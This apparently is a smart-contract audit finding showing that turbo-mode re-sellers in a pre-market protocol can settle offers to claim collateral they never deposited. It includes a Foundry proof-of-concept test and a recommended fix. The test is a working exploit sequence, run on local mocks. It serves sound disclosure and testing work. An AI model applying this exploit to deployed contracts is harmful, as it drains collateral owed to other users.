## Summary 📌

Re-sellers in turbo mode can use their offer structs to settle tokens and retrieve collateral they never deposited.

---

## Vulnerability Details 🔍 && Impact 📈

In a turbo chain of sellings, only first seller deposits collateral, next dont.

During this events, `Offer` structs are created for re-sellers. Problem is these offer structs can be used in `settleAskMaker()` during settlement. If the re-sellers also owns tokens, they can use their own tokens to withdraw collateral from the system they never deposited in the first place.

If the collateral that can be drainned is worth more than the tokens they got they will do it. Even if it was unprofitable this is still really bad as they are getting free collateral therefore undercollateralizing the system which, when all is settled will result in someone not being able to retrieve his full collateral amount.

---

## Proof Of Concept (PoC) 👨‍💻💻

Paste this test in the `PreMarkets.t.sol` file, import `import "forge-std/console.sol";`, and run `forge test --mt "test_settle_docs_freecol" -vv`:

<detials> <summary> See code test 👁️ </summary>

```solidity
    function test_settle_docs_freecol() public {
        console.log("-----------------");
        console.log("user -> Alice:  ", address(user));
        console.log("user1 -> Bob:   ", address(user1));
        console.log("-----------------");

        console.log("////////// STEP-1 //////////////");
        console.log("Alice creates an ask maker turbo offer and Bob buys part of it.");
        uint256 b_cache = mockUSDCToken.balanceOf(address(user));
        vm.prank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                1000 * 1e18,
                10_000,
                100,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        uint256 b_after = mockUSDCToken.balanceOf(address(user));
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        console.log("////////// STEP-2 //////////////");
        console.log("Bob buys 500pts with 500$ and lists them.");
        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createTaker(offerAddr, 500);
        StockInfo memory stck = preMarktes.getStockInfo(GenerateAddress.generateStockAddress(1));
        console.log(
            "Now Bob lists those 500pts at 1.1$ each. Because of turbo mode he does not deposit any collateral."
        );
        console.log("No-one buys Bob points yet he will settle tokens and get some collateral accounted for him.");
        b_cache = mockUSDCToken.balanceOf(address(user1));
        preMarktes.listOffer(GenerateAddress.generateStockAddress(stck.id), 550 * 1e18, 10_000);
        b_after = mockUSDCToken.balanceOf(address(user1));
        console.log("Bob collateral balance when relisting changed by: ", b_after - b_cache);

        console.log("////////////////////////////////");
        console.log("/////////    SETTLEMENT   //////////");
        console.log("///////////////////////////////");

        offerAddr = GenerateAddress.generateOfferAddress(0);
        vm.startPrank(user1);
        systemConfig.updateMarket("Backpack", address(mockPointToken), 0.01 * 1e18, block.timestamp - 1, 3600);

        console.log("Bob, a re-seller that did not need to deposit collateral settles his offer.");
        deal(address(mockPointToken), user1, 100000000 * 10 ** 18);
        offerAddr = GenerateAddress.generateOfferAddress(1);
        b_cache =
            tokenManager.userTokenBalanceMap(address(user1), address(mockUSDCToken), TokenBalanceType.SalesRevenue);
        vm.startPrank(user1);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
        deliveryPlace.settleAskMaker(offerAddr, preMarktes.getOfferInfo(offerAddr).usedPoints);
        b_after =
            tokenManager.userTokenBalanceMap(address(user1), address(mockUSDCToken), TokenBalanceType.SalesRevenue);

        console.log("Collateral Accunted for Bob: ", b_after - b_cache);
        console.log("Now Bob can withdraw collateral, that clearly belongs to Alice if she settled her tokens.");
    }
```

</details>

---

## **Tools Used 🛠️**

- Manual review.

---

## Recommendations 🎯

Do not allow `Offers` that come from a turbo maker to be settled as they do not relate to any collateral being deposited. For that you can just check the `maker` member of an `Offer` struct.

---